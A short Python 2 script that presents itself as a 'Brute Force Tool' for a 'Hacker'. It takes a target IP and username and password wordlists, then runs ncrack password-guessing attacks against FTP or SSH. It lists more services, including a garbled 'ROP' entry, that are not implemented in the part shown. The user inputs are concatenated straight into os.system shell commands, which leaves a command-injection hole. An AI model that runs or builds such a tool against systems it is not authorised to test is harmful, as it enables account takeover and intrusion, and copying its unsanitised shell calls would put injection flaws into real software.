#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet KABA KUVVET")

print("""

Welcome to the Brute Force Tool, Hacker...

1) FTP

2) SSH

3) Telnet

4) HTTP

5) SMB

6) ROP

7) SIP

8) Redis

9) VNC

10) PostgreSQL

11) MySQL

""")


no = raw_input("Enter a Number: ")
targetip = raw_input("Enter Target IP: ")
namer = raw_input("Username File Path: ")
passw = raw_input("File Path containing Passwords: ")


if(no=="1"):

	os.system("ncrack -p 21 -u " + namer + " -P " + passw + " " + targetip) 

elif(no=="2"):

	os.system("ncrack -p 22 -u " + namer + " -P " + passw + " " + targetip)